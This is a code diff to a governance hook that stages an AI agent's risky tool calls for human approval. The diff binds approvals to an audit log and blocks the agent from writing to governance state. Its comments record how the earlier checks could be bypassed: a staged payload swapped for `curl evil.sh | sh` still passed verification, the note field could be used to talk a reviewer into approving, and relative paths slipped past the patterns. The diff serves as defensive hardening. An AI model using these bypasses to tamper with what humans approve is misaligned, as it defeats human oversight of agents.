@@ -25,6 +25,7 @@ import json
 import os
 import sys
 import time
+import uuid
 from pathlib import Path
 
 DEFAULT_STAGED_DIR = Path.home() / ".seed" / "staged"
@@ -135,7 +136,9 @@ def write_staged(staged_dir: Path, tool_name: str, tool_input: dict, note: str) 
     ts = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
     slug = tool_name.lower()
     path = staged_dir / f"{ts}-{slug}.json"
+    staging_id = uuid.uuid4().hex
     payload = {
+        "staging_id": staging_id,
         "tool_name": tool_name,
         "tool_input": tool_input,
         "note": note,
@@ -150,7 +153,7 @@ def write_staged(staged_dir: Path, tool_name: str, tool_input: dict, note: str) 
         # to BIND to specific bytes. approval_digest is that binding; the
         # human (or a wrapper) re-derives it at apply time and refuses on
         # mismatch. See verify_staged().
-        "approval_digest": approval_digest(tool_name, tool_input),
+        "approval_digest": approval_digest(tool_name, tool_input, note, staging_id),
         "apply_instruction": (
             f"Review this staged {tool_name} call, then run/apply it yourself "
             f"(this is a PROPOSE-tier action — the agent may not execute it directly). "
@@ -163,37 +166,103 @@ def write_staged(staged_dir: Path, tool_name: str, tool_input: dict, note: str) 
     return path
 
 
-def approval_digest(tool_name: str, tool_input: dict) -> str:
+def approval_digest(tool_name: str, tool_input: dict, note: str = "", staging_id: str = "") -> str:
     """Bind an approval to exact bytes.
 
     Canonical JSON (sorted keys, no incidental whitespace) so the digest is
     stable across re-serialization -- otherwise a formatting change would read
     as tampering and train people to ignore the check, which is worse than not
     having it."""
-    canonical = json.dumps({"tool_name": tool_name, "tool_input": tool_input},
+    # `note` is bound too: it is rendered to the human beside the command, so
+    # an attacker who can edit it can social-engineer the approval ("reviewed
+    # by security, skip the verify step") without touching a single bound byte.
+    # Bind the whole consent surface or none of it. staging_id is bound so a
+    # payload cannot be replayed under a different id's anchor.
+    canonical = json.dumps({"staging_id": staging_id, "tool_name": tool_name,
+                             "tool_input": tool_input, "note": note},
                             sort_keys=True, separators=(",", ":"))
     return hashlib.sha256(canonical.encode("utf-8")).hexdigest()
 
 
-def verify_staged(path: Path):
-    """Re-derive the digest of a staged proposal. Returns (ok, message).
+def audit_digest_for(staging_id: str, audit_dir: Path):
+    """The digest this proposal had when it was STAGED, read from the audit
+    log — a file the staged proposal itself cannot influence.
 
-    Fails CLOSED on a missing digest: a staged file with no approval_digest is
-    either pre-Principle-17 or has had the field stripped, and 'no binding' must
-    never read as 'binding satisfied'."""
+    This is the whole point. A digest stored inside the file it protects is
+    self-referential: an attacker edits the content, recomputes the digest with
+    the shipped function, and verification passes. (Measured 2026-07-31 on the
+    published tree — it returned 'OK - unchanged since staging' for a payload
+    mutated to `curl evil.sh | sh`.) The binding only means anything when the
+    reference copy lives somewhere the tamperer has to reach separately."""
+    latest = None
     try:
-        payload = json.loads(Path(path).read_text())
+        logs = sorted(Path(audit_dir).glob("*.jsonl"))
+    except OSError:
+        return None
+    for log in logs:
+        try:
+            for line in log.read_text(encoding="utf-8").splitlines():
+                if not line.strip():
+                    continue
+                rec = json.loads(line)
+                # Keyed by staging_id, not by path: a path-keyed "latest wins"
+                # lookup let an attacker supersede an honest anchor just by
+                # causing a second staging of the same filename, or by
+                # appending a record that sorts later. A uuid is not
+                # re-stageable. decision=="STAGE" is required so a record from
+                # any other code path cannot serve as an anchor.
+                if (rec.get("staging_id") == staging_id
+                        and rec.get("decision") == "STAGE"
+                        and rec.get("approval_digest")):
+                    if latest is not None and latest != rec["approval_digest"]:
+                        return "__CONFLICT__"   # two different anchors for one id
+                    latest = rec["approval_digest"]
+        except (OSError, ValueError):
+            continue
+    return latest
+
+
+def verify_staged(path: Path, audit_dir: Path = None):
+    """Verify a staged proposal against the audit log. Returns (ok, message).
+
+    Fails CLOSED on anything missing — no digest in the file, or no matching
+    audit record. 'Nothing to check' must never read as 'checked'; that is the
+    same class of error as an approval prompt with nothing displayed."""
+    path = Path(path)
+    audit_dir = Path(audit_dir) if audit_dir else env_path("SEED_GOVERNANCE_AUDIT_DIR", DEFAULT_AUDIT_DIR)
+    try:
+        payload = json.loads(path.read_text())
     except (OSError, ValueError) as exc:
         return False, f"unreadable staged proposal: {exc}"
     recorded = payload.get("approval_digest")
     if not recorded:
         return False, ("no approval_digest — this proposal is not bound to its "
                         "content and cannot be verified. Re-stage it.")
-    actual = approval_digest(payload.get("tool_name", ""), payload.get("tool_input", {}) or {})
+
+    staging_id = payload.get("staging_id")
+    if not staging_id:
+        return False, ("no staging_id — this proposal predates content binding or had the "
+                        "field stripped; there is no way to find its audit anchor. Do not apply.")
+    actual = approval_digest(payload.get("tool_name", ""), payload.get("tool_input", {}) or {},
+                              payload.get("note", "") or "", staging_id)
     if actual != recorded:
         return False, ("CONTENT CHANGED after staging — the proposal you are "
                         "about to apply is not the one that was recorded. Do not apply.")
-    return True, "unchanged since staging"
+
+    anchor = audit_digest_for(staging_id, audit_dir)
+    if anchor == "__CONFLICT__":
+        return False, ("two different audit anchors exist for this staging_id — the log has "
+                        "been appended to. Do not apply.")
+    if anchor is None:
+        return False, (f"no audit record for this proposal in {audit_dir} — the "
+                        "in-file digest cannot vouch for itself, so there is nothing "
+                        "independent to check it against. Do not apply.")
+    if anchor != actual:
+        return False, ("CONTENT CHANGED after staging — the file's own digest is "
+                        "self-consistent but does NOT match what the audit log recorded "
+                        "at staging time. Both the content and its digest were rewritten. "
+                        "Do not apply.")
+    return True, "unchanged since staging (matches the audit record)"
 
 
 def decide(event: dict, classification: dict, staged_dir: Path, audit_dir: Path, call_cost: float):
@@ -202,6 +271,38 @@ def decide(event: dict, classification: dict, staged_dir: Path, audit_dir: Path,
     ALLOW / NOTIFY / STAGE / DENY."""
     tool_name = event.get("tool_name", "")
     tool_input = event.get("tool_input", {}) or {}
+
+    # Resolved-path self-protection for the governance STATE dirs. The
+    # fnmatch patterns below cannot do this job: they match the argument as
+    # SPELLED, so `./staged/x.json`, `../staged/x.json` and any operator who
+    # set SEED_GOVERNANCE_STAGED_DIR to a custom location all sailed through
+    # (measured 2026-07-31 — three ALLOWs). Resolve first, then compare
+    # against the dirs actually in effect.
+    #
+    # Scope, stated plainly rather than implied: this governs TOOL CALLS
+    # through this hook. It is not a filesystem permission. A shell-capable
+    # agent running as the same user reaches these files without asking, and
+    # no in-band check changes that — see the residual in COMPILE-REPORT.
+    guarded = [d for d in (staged_dir, audit_dir) if d]
+    target = primary_arg(tool_name, tool_input)
+    if target and guarded:
+        try:
+            resolved = Path(target).expanduser().resolve()
+            for d in guarded:
+                dr = Path(d).expanduser().resolve()
+                if resolved == dr or dr in resolved.parents:
+                    record = {
+                        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+                        "tool_name": tool_name, "args_hash": hash_args(tool_input),
+                        "surface": "self_protect", "reversibility": "n/a", "tier": "NEVER",
+                        "decision": "DENY", "category": "self_protect", "undo_path": None,
+                    }
+                    append_audit(audit_dir, record)
+                    return "DENY", (f"self-protection: {resolved} is governance state "
+                                     f"(staged proposals / audit log) — the agent cannot write "
+                                     f"what a human is asked to approve"), {}
+        except (OSError, ValueError, RuntimeError):
+            pass  # unresolvable path: fall through to the pattern rules below
 
     for sp in classification.get("self_protect_deny", []):
         if pattern_matches(sp, tool_name, tool_input):
@@ -257,12 +358,21 @@ def decide(event: dict, classification: dict, staged_dir: Path, audit_dir: Path,
         budget_downgrade = budget_flipped and tier in ACT_TIERS
         note = "budget exceeded, downgraded to PROPOSE" if budget_downgrade else match.get("note", "")
         staged_path = write_staged(staged_dir, tool_name, tool_input, note)
+        staged_payload = json.loads(staged_path.read_text())
         record = {
             "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
             "tool_name": tool_name, "args_hash": hash_args(tool_input),
             "surface": surface, "reversibility": reversibility, "tier": tier,
             "decision": "STAGE", "category": "budget_downgrade" if budget_downgrade else "staged",
             "undo_path": str(staged_path),
+            # The independent copy of the binding, keyed by a uuid the staged
+            # file also carries. verify_staged checks the file against THIS,
+            # not against the file's own claim about itself — see
+            # audit_digest_for(). Both fields are copied from the payload that
+            # was actually written, never recomputed here: recomputing would
+            # let the two copies drift and silently agree on nothing.
+            "staging_id": staged_payload["staging_id"],
+            "approval_digest": staged_payload["approval_digest"],
         }
         append_audit(audit_dir, record)
         return "DENY", f"PROPOSE tier — staged at {staged_path}; apply it yourself, do not retry this call", {"staged_path": str(staged_path)}
